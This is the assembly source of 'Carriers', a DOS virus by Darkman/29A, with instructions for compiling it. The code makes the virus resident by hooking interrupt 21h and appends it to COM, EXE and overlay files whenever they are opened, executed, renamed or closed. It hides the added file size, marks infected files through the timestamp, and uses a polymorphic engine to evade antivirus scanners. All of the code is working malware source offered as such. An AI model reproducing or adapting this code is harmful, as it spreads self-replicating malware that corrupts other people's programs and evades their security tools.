   ; comment *
   ;                                 Carriers            ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                                 Code by             ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;                               Darkman/29A            ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;                                                     ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                     ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;   Carriers is a 1332 bytes parasitic resident COM/EXE/Overlay virus. Infects
   ;   files at close file, delete file, get or set file attributes, load and/or
   ;   execute program and rename file by appending the virus to the infected file.
   ;   Carriers has an error handler, filesize stealth, retro structures and is
   ;   polymorphic in file using its internal polymorphic engine. Carriers is using
   ;   the server function call DOS exploit.
   ;
   ;   Compile Carriers with Turbo Assembler v 4.0 by typing:
   ;     TASM /M CARRIERS.ASM
   ;     TLINK /x CARRIERS.OBJ
   ;     EXE2BIN CARRIERS.EXE CARRIERS.COM (optional)
   ; *

   .model tiny
   .code

   code_begin:
            jmp     move_mcb

            db      0dh dup(?)      ; Memory Control Block (MCB)
   virus_begin:
            cld             ; Clear direction flag
            push    ds es       ; Save segments at stack

            call    delta_offset
   delta_offset:
            pop     si          ; Load SI from stack
            sub     si,(offset delta_offset-code_begin)

            mov     ax,ds       ; AX = segment of PSP for current ...
            dec     ax          ; AX = segment of current Memory C...
            mov     ds,ax       ; DS =    "    "     "      "     "

            xor     di,di       ; Zero DI
            cmp     byte ptr [di],'Z'   ; Last block in chain?
            jne     virus_exit      ; Already resident? Jump to virus_...
            mov     byte ptr [di],'M'   ; Not last block in chain
            sub     word ptr [di+03h],(data_end-code_begin+0fh)/10h
            sub     word ptr [di+12h],(data_end-code_begin+0fh)/10h
            mov     es,[di+12h]     ; ES = segment of the virus

            push    si          ; Save SI at stack
            mov     cx,(data_end-code_begin+01h)/02h
            segcs           ; Code segment as source segment
            rep     movsw       ; Move the virus to top of memory

            mov     ds,cx       ; DS = segment of interrupt table
            lea     di,int21_addr   ; DI = offset of int21_addr
            mov     si,(21h*04h)    ; SI = offset of interrupt 21h
            movsw           ; Get interrupt vector 21h
            movsw           ;  "      "       "     "
            mov     word ptr [si-04h],offset int21_virus
            mov     [si-02h],es     ; Set interrupt vector 21h
            pop     si          ; Load SI from stack
   virus_exit:
            pop     es ds       ; Load segments from stack

            mov     ax,ds       ; AX = segment of PSP for current ...
            mov     di,cs       ; DI = code segment
            cmp     ax,di       ; COM or EXE/Overlay executable?
            je      vir_com_exit    ; Equal? Jump to vir_com_exit

            add     ax,10h      ; AX = segment of beginning of EXE...
            add     cs:[si+initial_cs],ax

            cli             ; Clear interrupt-enable flag
   initial_sp   equ     word ptr $+01h  ; Initial SP
            mov     sp,00h      ; SP = initial SP

   initial_ss   equ     word ptr $+01h  ; Initial SS relative to start of ...
            add     ax,00h      ; Add initial SS relative to start...
            mov     ss,ax       ; SS = initial SS relative to star...
            sti             ; Set interrupt-enable flag

            call    zero_regs

            db      11101010b       ; JMP imm32 (opcode 0eah)
   initial_ip   dw      00h         ; Initial IP
   initial_cs   dw      0fff0h      ; Initial CS relative to start of ...
   vir_com_exit:
            mov     di,100h         ; DI = offset of beginning of code
            push    di          ; Save DI at stack
            lea     si,[si+origin_code] ; SI = offset of origin_code
            movsw           ; Move the original code to beginning
            movsb           ;  "    "     "      "   "      "

   zero_regs    proc    near        ; Zero registers
            xor     ax,ax       ; Zero AX
            mov     di,ax       ; Zero DI
            mov     si,ax       ; Zero SI

            ret             ; Return!
            endp

   int21_virus  proc    near        ; Interrupt 21h of Carriers
            push    bx cx ds es     ; Save registers at stack
            push    ax          ; Save AX at stack

            cld             ; Clear direction flag
            mov     al,ah       ; AL = function number

            cmp     al,11h      ; Find first matching file (FCB)?
            je      fcb_stealth     ; Equal? Jump to fcb_stealth
            cmp     al,12h      ; Find next matching file (FCB)?
            je      fcb_stealth     ; Equal? Jump to fcb_stealth
            cmp     al,4eh      ; Find first matching file (DTA)?
            je      dta_stealth     ; Equal? Jump to dta_stealth
            cmp     al,4fh      ; Find next matching file (DTA)?
            je      dta_stealth     ; Equal? Jump to dta_stealth

            push    dx di si bp     ; Save registers at stack

            cmp     al,41h      ; Delete file?
            je      open_file       ; Equal? Jump to open_file
            cmp     al,43h      ; Get or set file attributes?
            je      open_file       ; Equal? Jump to open_file
            cmp     al,4bh      ; Load and/or execute program?
            je      open_file       ; Equal? Jump to open_file
            cmp     al,56h      ; Rename file?
            je      open_file       ; Equal? Jump to open_file

            cmp     al,3eh      ; Close file?
            jne     int21_exit      ; Not equal? Jump to int21_exit

            call    infect_file
   int21_exit:
            pop     bp si di dx     ; Load registers from stack

            pop     ax          ; Load AX from stack
            pop     es ds cx bx     ; Load registers from stack

   int21_simula proc    near        ; Simulate interrupt 21h
            db      11101010b       ; JMP imm32 (opcode 0eah)
   int21_addr   dd      ?           ; Address of interrupt 21h
            endp
            endp

   int24_virus  proc    near        ; Interrupt 24h of Carriers
            mov     al,03h      ; Fail system call in progress

   int2a_virus  proc    near        ; Interrupt 2Ah of Carriers
            iret            ; Interrupt return!
            endp
            endp
   open_file:
            jmp     open_file_
   fcb_stealth:
            pop     ax          ; Load AX from stack

            call    int21_simu__
            push    ax          ; Save AX at stack
            pushf           ; Save flags at stack
            or      al,al       ; Successful?
            jnz     filesiz_exit    ; Not successful? Jump to filesiz_...

            mov     ah,51h      ; Get current PSP address
            call    int21_simu__
            mov     ds,bx       ; DS = segment of PSP for current ...
            cmp     ds:[16h],bx     ; Parent PSP equal to current PSP?
            jne     filesiz_exit    ; Not equal? Jump to filesiz_exit

            mov     ah,2fh      ; Get disk transfer area address
            call    int21_simul_

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            cmp     byte ptr [bx],0ffh
            jne     not_extended    ; Not extended FCB? Jump to not_ex...

            add     bx,07h      ; BX = offset of normal FCB
   not_extended:
            mov     ax,[bx+09h]     ; AX = file extension
            mov     cl,[bx+0bh]     ; CL =  "       "

            mov     ch,[bx+17h]     ; CH = low-order byte of file time

            add     bx,03h      ; BX = offset of filesize

            jmp     test_stealth
   dta_stealth:
            pop     ax          ; Load AX from stack

            call    int21_simu__
            push    ax          ; Save AX at stack
            pushf           ; Save flags at stack
            jc      filesiz_exit    ; Error? Jump to filesiz_exit

            mov     ah,2fh      ; Get disk transfer area address
            call    int21_simul_

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            push    si          ; Save SI at stack
            lea     si,[bx+1eh]     ; SI = offset of filename
   find_dot:
            lodsb           ; AL = byte of filename
            cmp     al,'.'              ; Found dot in filename?
            jne     find_dot        ; Not equal? Jump to find_dot

            lodsw           ; AX = file extension
            xchg    ax,cx       ; CX =  "       "
            lodsb           ; AL = file extension
            xchg    ax,cx       ; CL =  "       "
            pop     si          ; Load SI from stack

            mov     ch,[bx+16h]     ; CH = low-order byte of file time
   test_stealth:
            and     ch,00011111b    ; CH = seconds of file time
            cmp     ch,00011101b    ; Infected (58 seconds)?
            jne     filesiz_exit    ; Not infected? Jump to filesiz_exit

            call    tst_file_ext
            jne     filesiz_exit    ; Not equal? Jump to filesiz_exit

            sub     [bx+1ah],(code_end-code_begin+1482h)
            sbb     word ptr [bx+1ch],00h
   filesiz_exit:
            popf            ; Load flags from stack
            pop     ax          ; Load AX from stack
            pop     es ds cx bx     ; Load registers from stack

            retf    02h         ; Return far and add option-pop-va...
   open_file_:
            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     ah,60h      ; Canonicalize filename or path
            lea     di,filename     ; DI = offset of filename
            mov     si,dx       ; SI =   "    "     "
            call    int21_simul_

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ax,3d00h        ; Open file (read)
            mov     dx,di       ; DX = offset of filename
            call    int21_simul_
            xchg    ax,bx       ; BX = file handle

            call    infect_file

            mov     ah,3eh      ; Close file
            call    int21_simul_

            jmp     int21_exit

   int21_simul_ proc    near        ; Simulate interrupt 21h
            push    es ds di si dx cx bx ax

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     cx,08h      ; Move sixteen bytes
            lea     dx,dpl_begin    ; DX = offset of dpl_begin
            mov     di,dx       ; DI =   "    "      "
   loop_stack:
            pop     ax          ; Load AX from stack
            stosw           ; Store register value within dpl_...

            loop    loop_stack

            xor     ax,ax       ; Zero AX
            stosw           ; Store DOS parameter list (reserved)
            stosw           ; Store DOS parameter list (comput...

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,51h      ; Get current PSP address
            call    int21_simu__

            xchg    ax,bx       ; AX = segment of PSP for current ...
            stosw           ; Store segment of PSP for current...

            mov     ax,5d00h        ; Server function call

   int21_simu__ proc    near        ; Simulate interrupt 21h
            pushf           ; Save flags at stack
            push    cs          ; Save CS at stack

            call    int21_simula

            ret             ; Return!
            endp
            endp

   infect_file  proc    near        ; Infect COM/EXE/Overlay file
            mov     si,(24h*04h)/10h    ; SI = segment within interrupt table
            mov     ds,si       ; DS =    "      "        "       "
            xor     si,si       ; Zero SI

            push    [si+(24h*04h)-(24h*04h)]
            push    [si+(24h*04h+02h)-(24h*04h)]
            mov     word ptr [si+(24h*04h)-(24h*04h)],offset int24_virus
            mov     [si+(24h*04h+02h)-(24h*04h)],cs
            push    [si+(2ah*04h)-(24h*04h)]
            push    [si+(2ah*04h+02h)-(24h*04h)]
            mov     word ptr [si+(2ah*04h)-(24h*04h)],offset int2a_virus
            mov     [si+(2ah*04h+02h)-(24h*04h)],cs

            push    ds          ; Save DS at stack

            mov     ax,1220h        ; Get system file table number
            int     2fh

            push    bx          ; Save BX at stack
            mov     ax,1216h        ; Get address of system FCB
            mov     bl,es:[di]      ; BL = system file table entry
            int     2fh
            pop     bx          ; Load BX from stack

            mov     byte ptr es:[di+02h],02h

            test    byte ptr es:[di+05h],10000000b
            jnz     infect_exit     ; Character device? Jump to infect...

            mov     ax,es:[di+28h]  ; AX = file extension
            mov     cl,es:[di+2ah]  ; CL =  "       "

            call    tst_file_ext
            jne     infect_exit     ; Not equal? Jump to infect_exit

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     al,es:[di+0dh]  ; AL = low-order byte of file time
            and     al,00011111b    ; AL = seconds of file time
            cmp     al,00011101b    ; Previously infected (58 seconds)?
            je      infect_exit     ; Equal? Jump to infect_exit

            mov     es:[di+15h],si  ; Set current file position (SOF)
            mov     es:[di+17h],si  ; Set current file position (SOF)

            mov     ah,3fh      ; Read from file
            mov     cx,18h      ; Read twenty-four bytes
            lea     dx,origin_code  ; DX = offset of origin_code
            call    int21_simul_

            mov     es:[di+15h],si  ; Set current file position (SOF)

            push    di          ; Save DI at stack
            mov     cl,0bh      ; Compare eleven bytes
            add     di,20h      ; DI = offset of filename
            lea     si,command_com  ; SI = offset of command_com
            rep     cmpsb       ; COMMAND.COM?
            pop     di          ; Load DI from stack
            je      infect_exit     ; Equal? Jump to infect_exit

            mov     si,dx       ; SI = offset of origin_code

            mov     ax,es:[di+11h]  ; AX = low-order word of filesize
            mov     dx,es:[di+13h]  ; AX = high-order word of filesize

            or      dx,dx       ; Filesize too small?
            jnz     test_exe_sig    ; Not zero? Jump to test_exe_sig
            cmp     ax,1000h        ; Filesize too small?
            jae     test_exe_sig    ; Above or equal? Jump to infect_exit
   infect_exit:
            jmp     infect_exit_
   test_exe_sig:
            mov     cx,[si]         ; CX = EXE/Overlay signature

            xor     cx,'MZ'             ; EXE/Overlay signature?
            jz      test_exe_ov     ; Found EXE/Overlay signature? Jum...
            xor     cx,('ZM' xor 'MZ')  ; EXE/Overlay signature?
            jz      test_exe_ov     ; Found EXE/Overlay signature? Jum...

            cmp     ax,0fef8h-(data_end-code_begin)
            ja      infect_exit     ; Above? Jump to infect_exit
   calc_offset:
            mov     cx,03h      ; Write three bytes

            sub     ax,cx       ; AX = offset of virus within infe...
            mov     [virus_offset],ax   ; Store offset of virus within inf...

            add     ax,103h         ; AX = decryptor's offset
            xchg    ax,bp       ; BP =      "        "

            xor     al,al       ; AL = flags
            lea     dx,infect_code  ; DX = offset of infect_code

            jmp     infect_file_
   test_exe_ov:
            push    dx          ; Save DX at stack
            push    ax          ;  "   AX "    "

            call    div_by_pages

            pop     cx          ; Load CX from stack (AX)
            xchg    ax,cx       ; AX = low-order byte of filesize

            cmp     dx,[si+02h]     ; Internal overlay?
            pop     dx          ; Load DX from stack
            jne     infect_exit     ; Not equal? Jump to infect_exit
            cmp     cx,[si+04h]     ; Internal overlay?
            jne     infect_exit     ; Not equal? Jump to infect_exit

            cmp     byte ptr [si+18h],40h
            je      infect_exit     ; New executable? Jump to infect_exit

            push    ax dx       ; Save registers at stack
            push    di si es        ;  "       "     "    "

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     di,initial_ss   ; DI = offset of initial_ss
            add     si,0eh      ; SI = offset of initial SS relati...
            movsw           ; Store initial SS relative to sta...

            lea     di,initial_sp   ; DI = offset of initial_sp
            movsw           ; Store initial SP

            lea     di,initial_ip-02h   ; DI = offset of initial_ip - 02h
            cmpsw           ; SI = offset of initial IP
            movsw           ; Store initial IP
            movsw           ; Store initial CS relative to sta...

            mov     cx,10h      ; Divide by paragraphs
            div     cx          ; DX:AX = filesize in paragraphs

            mov     bp,dx       ; BP = decryptor's offset

            pop     es si di        ; Load registers from stack

            sub     ax,[si+08h]     ; Subtract header size in paragrap...

            mov     [si+14h],dx     ; Store initial IP
            mov     [si+16h],ax     ; Store initial CS relative to sta...

            add     ax,((code_end-code_begin+1491h)/10h+01h)

            mov     [si+0eh],ax     ; Store initial SS relative to sta...
            and     word ptr [si+10h],1111111111111110b

            pop     dx ax       ; Load registers from stack
            add     ax,(code_end-code_begin+1482h)
            adc     dx,00h      ; Convert to 32-bit

            call    div_by_pages

            mov     [si+04h],ax     ; Store total number of 512-bytes ...
            mov     [si+02h],dx     ; Store number of bytes in last 51...

            mov     al,00000011b    ; AL = flags
            mov     cx,18h      ; Write twenty-four bytes
            mov     dx,si       ; DX = offset of origin_code
   infect_file_:
            push    es:[di+0dh]     ; Save file time at stack
            push    es:[di+0fh]     ; Save file date at stack

            push    ax          ; Save AX at stack

            mov     ah,40h      ; Write to file
            call    int21_simul_

            add     di,15h      ; DI = offset of current offset in...
            lea     si,[di-04h]     ; SI = offset of filesize
            seges           ; Extra segment as source segment
            movsw           ; Move low-order word of filesize ...
            seges           ; Extra segment as source segment
            movsw           ; Move high-order word of filesize...

            pop     ax          ; Load AX from stack

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     cx,(code_end-code_begin)
            lea     di,data_buffer  ; DI = offset of data_buffer
            xor     si,si       ; Zero SI
            push    bx di       ; Save registers at stack
            call    c_pe_poly

            mov     ah,40h      ; Write to file
            mov     cx,(code_end-code_begin+1482h)
            pop     dx bx       ; Load registers from stack
            call    int21_simul_

            mov     ax,5701h        ; Set file's date and time
            pop     dx          ; Load DX from stack (file date)
            pop     cx          ; Load CX from stack (file time)
            and     cl,11100000b    ; CX = hours and minutes of file time
            or      cl,00011101b    ; Set infection mark (58 seconds)
            call    int21_simul_
   infect_exit_:
            xor     si,si       ; Zero SI
            pop     ds          ; Save DS at stack

            pop     [si+(2ah*04h+02h)-(24h*04h)]
            pop     [si+(2ah*04h)-(24h*04h)]
            pop     [si+(24h*04h+02h)-(24h*04h)]
            pop     [si+(24h*04h)-(24h*04h)]

            ret             ; Return!
            endp

   tst_file_ext proc    near        ; Test file extension
            cmp     ax,'OC'             ; COM executable?
            jne     test_exe        ; Not equal? Jump to test_exe
            cmp     cl,'M'              ; COM executable?

            ret             ; Return!
   test_exe:
            cmp     ax,'XE'             ; EXE executable?
            jne     test_ov         ; Not equal? Jump to test_ov
            cmp     cl,'E'              ; EXE executable?

            ret             ; Return!
   test_ov:
            cmp     ax,'VO'             ; OV? executable?
            jne     tst_fil_exit    ; Not equal? Jump to tst_fil_exit

            cmp     cl,'L'              ; OVL executable?
            je      tst_fil_exit    ; Equal? Jump to tst_fil_exit

            cmp     cl,'R'              ; OVR executable?
   tst_fil_exit:
            ret             ; Return!
            endp

   div_by_pages proc    near        ; Divide by pages
            mov     cx,200h         ; Divide by pages
            div     cx          ; DX:AX = filesize in pages

            or      dx,dx       ; No bytes in last 512-bytes page ...
            je      dont_inc_pag    ; Equal? Jump to dont_inc_pag

            inc     ax          ; Increase total number of 512-byt...
   dont_inc_pag:
            ret
            endp

   comment *
                        Carriers (polymorphic engine)  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
                                   Code by             ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
                                 Darkman/29A            ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
                                                       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
                                                       ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ

            Calling parameters:
              AL     Flags
              CX     Length of original code
              BP     Decryptor's offset
              DS:SI  Pointer to original code
              ES:DI  Pointer to decryptor + encrypted code

            Return parameters:
              CX     Length of decryptor + encrypted code

     Flags:
       xxxxxxx1  Generate CS: in front of the decryption opcode.
       xxxxxx1x  Generate garbage in the beginning.
       111111xx  Unused.

     Garbage instructions:
       JMP imm8; JMP imm16

     Count/index registers:
       BX; BP; DI; SI

     Registers holding the decryption key:
       AL; AH; BL; BH; CL; CH; DL; DH; AX; BX; CX; DX; BP; SI; DI

     Decryptor:
       (One garbage instruction).
       (MOV reg,imm); MOV reg16,imm16                (Decryption key)
       (One garbage instruction).
       MOV reg16,imm16; (MOV reg,imm)          (Offset of encrypted code)
       One garbage instruction.
       ADD (CS:)[reg16],imm/reg; SUB (CS:)[reg16],imm/reg; XOR (CS:)[reg16],im...
       One garbage instruction.
       ADD reg16,01h; ADD reg16,02h; INC reg16; INC reg16, INC reg16, SUB reg1...
       One garbage instruction.
       CMP reg16,imm16                    (End of encrypted code)
       JA imm8/JAE imm8/JE imm8             (Beginning of encrypted code)
       JMP imm16  (Beginning of ADD (CS:)[reg16],imm8/reg8; SUB (CS:)[reg16],i...
       One garbage instruction.

     Min. decryptor size:             271 bytes.
     Max. decryptor size:            5250 bytes.
     Carriers (polymorphic engine) size:  487 bytes.

     I would like to thank Tcp/29A for the help and Rhincewind/VLAD for the
     Random Number Generator (RNG).
   *

   c_pe_poly    proc    near        ; Carriers (polymorphic engine)
            push    si          ; Save SI at stack
            push    cx          ;  "   CX "    "
            push    cx          ;  "   CX "    "
            push    di          ;  "   DI "    "
            push    ax          ;  "   AX "    "

            test    al,00000010b    ; Generate garbage in the beginning?
            jz      get_regs        ; Zero? Jump to get_regs

            call    gen_garbage
   get_regs:
            mov     ax,04h      ; Random number within four
            call    rnd_in_range
            xchg    ax,bx       ; BL = count/index register number

            lea     si,[bx+index_table] ; SI = offset of count/index register
            lodsb           ; AL = count/index register
            mov     dh,al       ; DH =      "         "
   get_key_reg:
            call    get_rnd_num_
            mov     dl,al       ; DL = register holding decryption...

            and     al,00001111b    ; AL =    "        "          "
            cmp     al,00001100b    ; Stack pointer (SP)?
            je      get_key_reg     ; Equal? Jump to get_key_reg

            test    al,00001000b    ; 16-bit encryption/decryption key?
            jnz     test_reg16      ; Not zero? Jump to test_reg16

            and     al,00000011b    ; AL = register holding decryption...
   test_reg16:
            and     al,00000111b    ; AL = register holding decryption...

            cmp     al,dh       ; Count/index register equal to r...?
            je      get_regs        ; Equal? Jump to get_regs
   initial_regs:
            test    dl,00010000b    ; Generate MOV reg,imm first and ...?
            jz      gen_mov_r16_    ; Zero? Jump to gen_mov_r16_

            call    gen_mov_reg
            call    gen_mov_r16

            jmp     test_gen_cs
   gen_mov_r16_:
            call    gen_mov_r16
            call    gen_mov_reg
   test_gen_cs:
            mov     [decrypt_off],di    ; Store offset of decryption opcode

            pop     ax          ; Load AX from stack
            test    al,00000001b    ; Generate CS: in front of the de...?
            jnz     gen_cs      ; Not zero? Jump to gen_cs

            test    dl,00100000b    ; Generate CS?
            jz      dont_gen_cs     ; Zero? Jump to dont_gen_cs
   gen_cs:
            mov     al,00101110b    ; CS:
            stosb           ; Store CS:
   dont_gen_cs:
            call    tst_key_size

            lea     si,decrypt_tbl  ; SI = offset of decrypt_tbl

            test    dl,01000000b    ; Register holding decryption key?
            jz      key_reg_used    ; Zero? Jump to key_reg_used

            or      al,10000000b    ; ADD [reg16],imm/SUB [reg16],imm/...
            stosb           ; Store ADD [reg16],imm/SUB [reg16...

            call    lod_rnd_byte

            call    gen_decrypt_

            call    sto_temp_imm

            jmp     gen_inc_r16_
   key_reg_used:
            xchg    ax,cx       ; CL = decryption algorithm

            call    lod_rnd_byte

            or      al,cl       ; ADD [reg16],imm/SUB [reg16],imm/...
            stosb           ; Store ADD [reg16],imm/SUB [reg16...

            mov     al,dl       ; AL = register holding decryption...
            mov     cl,03h      ; Shift register holding decryptio...
            and     al,00000111b    ; AL = register holding decryption...
            shl     al,cl       ; AL =    "        "          "

            call    gen_decrypt_
   gen_inc_r16:
            call    gen_garbage
   gen_inc_r16_:
            mov     ax,04h      ; Random number within four
            call    rnd_in_range

            lea     si,inc_r16_tbl-01h  ; SI = offset of inc_r16_tbl-01h
            shl     ax,01h      ; Multiply increase index register...
            add     si,ax       ; SI = offset of increase index re...
            lodsw           ; AX = increase index register opcode

            or      ah,dh       ; AH = count/index register
            cmp     ah,01000111b    ; INC reg16?
            ja      sto_inc_r16     ; Above? Jump to sto_inc_r16

            mov     al,ah       ; INC reg16; INC reg16
            stosw           ; Store INC reg16; INC reg16

            call    tst_key_siz_

            jmp     gen_cmp_r16_
   sto_inc_r16:
            stosw           ; Store increase index register op...
            xchg    ax,bx       ; BX = increase index register opcode

            call    tst_key_size

            inc     ax          ; Increase 16-bit immediate

            cmp     bh,11101000b    ; SUB reg16,imm16?
            jb      sto_inc_r16_    ; Below? Jump to sto_inc_r16_

            neg     ax          ; Negate 16-bit immediate
   sto_inc_r16_:
            stosw           ; Store 16-bit immediate

            cmp     bl,10000011b    ; ADD reg16,imm8?
            jne     gen_cmp_r16     ; Not equal? Jump to gen_cmp_r16

            dec     di          ; 8-bit immediate
   gen_cmp_r16:
            call    gen_garbage
   gen_cmp_r16_:
            mov     ax,1111100010000001b
            or      ah,dh       ; CMP reg16,imm16
            stosw           ; Store CMP reg16,imm16

            mov     [cmp_r16_i16],di    ; Store offset of CMP reg16,imm16
            stosw           ; Store 16-bit immediate

            push    cx          ; Save CX at stack
            lea     si,jmp_imm8_tbl     ; SI = offset of jmp_imm8_tbl
            call    lod_rnd_byte

            stosb           ; Store jump condition
   get_rnd_num:
            mov     ax,80h      ; Random number within one hundred...
            call    rnd_in_range
            cmp     ax,40h      ; Below sixty-four bytes?
            jb      get_rnd_num     ; Below? Jump to get_rnd_num

            stosb           ; Store 8-bit immediate

            xchg    cx,ax       ; CX = 8-bit immediate

            mov     al,11101001b    ; JMP imm16
            stosb           ; Store JMP imm16

   decrypt_off  equ     word ptr $+01h  ; Offset of decryption opcode
            mov     ax,00h      ; DI = offset of decryption opcode
            sub     ax,di       ; Subtract offset of end of JMP im...
            dec     ax          ; Decrease 16-bit immediate
            dec     ax          ;    "       "        "
            stosw           ; Store 16-bit immediate

            sub     cx,(mcb_end-mcb+03h)
   garbage_loop:
            call    get_rnd_num_

            stosb           ; Store 8-bit random number

            loop    garbage_loop
            pop     cx          ; Load CX from stack

            pop     ax          ; Load AX from stack (DI)
            sub     ax,di       ; AX = length of decryptor
            neg     ax          ; Negate length of decryptor
            add     ax,bp       ; AX = offset of encrypted code wi...
   mov_r16_i16  equ     word ptr $+01h  ; Offset of MOV reg16,imm16
            mov     ds:[00h],ax     ; Store offset of encrypted code

            pop     bx          ; Load BX from stack (CX)
            test    bl,00000001b    ; Align offset of end of encrypte...?
            jz      sto_cmp_r16     ; Zero? Jump to sto_cmp_r16

            inc     bx          ; Increase offset of end of encryp...
   sto_cmp_r16:
            add     ax,bx       ; Add length of original code to o...
   cmp_r16_i16  equ     word ptr $+01h  ; Offset of CMP reg16,imm16
            mov     ds:[00h],ax     ; Store offset of end of encrypted...

            push    di          ; Save DI at stack
            lea     bx,encrypt_tbl  ; BX = offset of encrypt_tbl
            lea     di,encrypt_algo     ; DI = offset of encrypt_algo
            add     bl,ch       ; Add encryption/decryption algor...
            mov     al,[bx]         ; AL = encryption algorithm
            mov     bx,di       ; BX = offset of encrypt_algo
            stosb           ; Store encryption algorithm
            inc     di          ; Increase index register
            stosb           ; Store encryption algorithm
   get_rnd_key:
            call    get_rnd_num_

            and     al,ah       ; Weak encryption/decryption key?
            jz      get_rnd_key     ; Zero? Jump to get_rnd_key
            cmp     al,ah       ; Weak encryption/decryption key?
            je      get_rnd_key     ; Equal? Jump to get_rnd_key

   mov_reg_imm  equ     word ptr $+01h  ; Offset of MOV reg,imm
            mov     di,00h      ; BX = offset of MOV reg,imm

            test    dl,00001000b    ; 8-bit encryption/decryption key?
            jz      store_key       ; Zero? Jump to store_key

            stosw           ; Store 16-bit encryption/decrypti...

            inc     byte ptr [bx]   ; Store encryption algorithm
            mov     byte ptr [bx+02h],00111000b

            db      00111000b       ; CMP [BP+SI+0AAC4],CL (opcode 38h)
   store_key:
            mov     al,ah       ; AL = 8-bit encryption/decryption...
            stosb           ; Store 8-bit encryption/decryptio...

            xchg    ax,bx       ; BX = encryption/decryption key
            pop     di          ; Load DI from stack

            pop     cx          ; Load CX from stack
            inc     cx          ; Increase length of original code
            shr     cx,01h      ; Divide length of original code b...

            pop     si          ; Load SI from stack
   encrypt_loop:
            lodsw           ; AX = word of original code

   encrypt_algo equ     byte ptr $      ; Offset of encryption algorithm
            add     al,bl       ; AL = encrypted low-order byte of...
            add     ah,bh       ; AH = encrypted high-order byte o...

            stosw           ; Store encrypted word

            loop    encrypt_loop

            ret             ; Return!
            endp

   gen_mov_reg  proc    near        ; Generate MOV reg,imm
            mov     al,dl       ; AL = register holding decryption...

            test    al,01000000b    ; Register holding decryption key?
            jnz     gen_mov_exit    ; Not zero? Jump gen_mov_exit

            or      al,10110000b    ; MOV reg,imm
            stosb           ; Store MOV reg,imm

            call    sto_temp_imm
   gen_mov_exit:
            ret             ; Return!
            endp

   gen_mov_r16  proc    near        ; Generate MOV reg16,imm16
            mov     al,dh       ; AL = count/index register
            or      al,10111000b    ; MOV reg16,imm16
            stosb           ; Store MOV reg16,imm16

            mov     [mov_r16_i16],di    ; Store offset of MOV reg16,imm16
            stosw           ; Store 16-bit immediate

            call    gen_garbage

            ret             ; Return!
            endp

   tst_key_size proc    near        ; Test size of encryption/decrypti...
            xor     ax,ax       ; Zero AX
            test    dl,00001000b    ; 8-bit encryption/decryption key?
            jz      tst_key_exit    ; Zero? Jump to tst_key_exit

            inc     ax          ; 16-bit encryption/decryption key
   tst_key_exit:
            ret             ; Return!
            endp

   lod_rnd_byte proc    near        ; Load random byte within table
            mov     ax,03h      ; Random number within three
            call    rnd_in_range
            mov     ch,al       ; CH = random number within three

            add     si,ax       ; SI = offset of within table
            lodsb           ; AL = byte of table

            ret             ; Return!
            endp

   gen_decrypt_ proc    near        ; Generate decryption opcode
            mov     cl,al       ; CL = decryption algorithm
            lea     si,[bx+index_table_]
            lodsb           ; AL = count/index register

            or      al,cl       ; ADD [reg16],imm/SUB [reg16],imm/...
            stosb           ; Store ADD [reg16],imm/SUB [reg16...

            test    al,01000000b    ; Base pointer?
            jz      didnt_use_bp    ; Zero? Jump to didnt_use_bp

            xor     al,al       ; Zero 8-bit immediate
            stosb           ; Store 8-bit immediate
   didnt_use_bp:
            ret             ; Return!
            endp

   sto_temp_imm proc    near        ; Store temporary immediate
            mov     [mov_reg_imm],di    ; Store offset of MOV reg16,imm16
            stosw           ; Store 16-bit immediate

   tst_key_siz_ proc    near        ; Test size of encryption/decrypti...
            test    dl,00001000b    ; 16-bit encryption/decryption key?
            jnz     gen_garbage     ; Not zero? Jump to gen_garbage

            dec     di          ; 8-bit immediate

   gen_garbage  proc    near        ; Generate garbage
            push    ax cx       ; Save registers at stack
   gen_garbage_:
            mov     ax,401h         ; Random number within one thousan...
            call    rnd_in_range
            cmp     ax,40h      ; Below sixty-four bytes?
            jb      gen_garbage_    ; Below? Jump to gen_garbage_

            push    ax          ; Save AX at stack
            cmp     ax,80h      ; Generate JMP imm8 or JMP imm16?
            mov     al,11101011b    ; JMP imm8 (opcode 0ebh)
            jb      gen_jmp_i8      ; Below? Jump to gen_jmp_i8

            mov     al,11101001b    ; JMP imm16 (opcode 0e9h)
   gen_jmp_i8:
            stosb           ; Store JMP imm8/JMP imm16

            pop     ax          ; Load AX from stack
            stosb           ; Store 8-bit immediate
            jb      gen_jmp_i8_     ; Below? Jump to gen_jmp_i8_

            dec     di          ; Decrease index register

            stosw           ; Store 16-bit immediate
   gen_jmp_i8_:
            xchg    cx,ax       ; CX = number of random bytes
   garbage_loo_:
            call    get_rnd_num_

            stosb           ; Store 8-bit random number

            loop    garbage_loo_

            pop     cx ax       ; Load registers from stack

            ret             ; Return!
            endp
            endp
            endp
            endp

   rnd_in_range proc    near        ; Random number within range
            push    bx dx       ; Save registers at stack
            xchg    ax,bx       ; BX = number within range
            call    get_rnd_num_

            xor     dx,dx       ; Zero DX
            div     bx          ; DX = random number within range
            xchg    ax,dx       ; AX =   "      "      "      "
            pop     dx bx       ; Load registers from stack

            ret             ; Return!
            endp

